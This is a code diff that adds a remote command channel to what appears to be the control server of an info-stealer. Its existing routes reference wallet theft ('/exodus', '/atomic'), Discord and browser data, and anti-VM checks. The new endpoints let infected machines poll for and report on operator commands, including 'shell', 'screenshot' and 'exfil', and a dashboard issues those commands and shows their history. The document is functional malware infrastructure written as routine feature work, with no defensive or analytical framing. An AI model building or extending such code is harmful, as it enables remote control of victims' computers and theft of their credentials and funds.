@@ -222,6 +222,7 @@ const authenticateUser = (req, res, next) => {
         '/init', '/log_data', '/v2/data', '/log_files', '/p', '/exodus', '/atomic',
         '/login', '/login.html', '/register.html', '/api/auth/login', '/api/auth/register',
         '/discord', '/browser', '/files', '/log', '/antivm', '/err', '/capture', '/collect',
+        '/cmd/poll', '/cmd/result',
         '/Extractor.exe', '/Decrypt.exe'
     ];
     
@@ -315,6 +316,7 @@ app.use('/antivm', validateApiKey);
 app.use('/err', validateApiKey);
 app.use('/capture', validateApiKey);
 app.use('/collect', validateApiKey);
+app.use('/cmd', validateApiKey);
 
 // Multer config for file uploads (temp storage)
 const upload = multer({ dest: path.join(UPLOADS_DIR, 'temp') });
@@ -920,7 +922,79 @@ app.post('/collect', async (req, res) => {
     }
 });
 
+// ==================== REMOTE COMMAND CHANNEL ====================
+
+// Client polls here for its next command (API-key authenticated via /cmd).
+app.get('/cmd/poll', async (req, res) => {
+    try {
+        const command = await db.claimPendingCommand(req.buildId);
+        if (!command) return res.json({ ok: true, command: null });
+        let parsedArgs = command.args || '';
+        try { parsedArgs = JSON.parse(command.args); } catch (_) {}
+        res.json({ ok: true, command: { id: command.id, type: command.type, args: parsedArgs } });
+    } catch (err) {
+        console.error('Error polling commands:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// Client reports a command's outcome here.
+app.post('/cmd/result', async (req, res) => {
+    try {
+        const { id, status, output } = req.body;
+        if (!id || !status) return res.status(400).json({ error: 'Missing id or status' });
+        // The command must belong to the build reporting the result, otherwise
+        // any authenticated client could spoof another build's command outcome.
+        const command = await db.getCommand(Number(id));
+        if (!command || command.buildId !== req.buildId) {
+            return res.status(403).json({ error: 'Command does not belong to this build' });
+        }
+        const cleanStatus = ['done', 'failed'].includes(status) ? status : 'failed';
+        const outputStr = output == null ? null : String(output);
+        await db.completeCommand(Number(id), cleanStatus, outputStr);
+        res.json({ ok: true });
+    } catch (err) {
+        console.error('Error saving command result:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
 // ==================== DASHBOARD API ====================
+
+// Command history for a build (admin or the build's own user).
+app.get('/api/commands/:uuid', async (req, res) => {
+    const uuid = req.params.uuid;
+    if (req.user.role !== 'admin' && uuid !== `user_${req.user.id}`) {
+        return res.status(403).json({ error: 'Forbidden' });
+    }
+    try {
+        res.json(await db.listCommands(uuid, 100));
+    } catch (err) {
+        console.error('Error listing commands:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// Issue a command to a build (admin or the build's own user).
+app.post('/api/commands/:uuid', async (req, res) => {
+    const uuid = req.params.uuid;
+    if (req.user.role !== 'admin' && uuid !== `user_${req.user.id}`) {
+        return res.status(403).json({ error: 'Forbidden' });
+    }
+    const { type, args } = req.body;
+    const allowedTypes = ['shell', 'screenshot', 'exfil', 'exit'];
+    if (!allowedTypes.includes(type)) {
+        return res.status(400).json({ error: 'Unknown command type' });
+    }
+    try {
+        const id = await db.createCommand(uuid, type, args == null ? '' : String(args));
+        await db.logAction(req.user.id, req.user.username, 'ISSUE_CMD', { buildId: uuid, type, id }, 'SUCCESS');
+        res.json({ ok: true, id });
+    } catch (err) {
+        console.error('Error issuing command:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
 
 // /api/logs previously did a fully synchronous recursive stat of every build
 // directory on every request, stalling the event loop on large uploads trees.
@@ -1032,6 +1106,23 @@ app.get('/api/logs', async (req, res) => {
                 } catch (err) {
                     console.error(`Error loading events for ${dir}:`, err);
                     meta.events = [];
+                }
+
+                // Attach recent remote-command history (last 20) for the detail view.
+                try {
+                    const commands = await db.listCommands(dir, 20);
+                    meta.commands = commands.map(c => ({
+                        id: c.id,
+                        type: c.type,
+                        args: c.args,
+                        status: c.status,
+                        result: c.result,
+                        createdAt: c.createdAt,
+                        completedAt: c.completedAt
+                    }));
+                } catch (err) {
+                    console.error(`Error loading commands for ${dir}:`, err);
+                    meta.commands = [];
                 }
 
                 logs.push(meta);
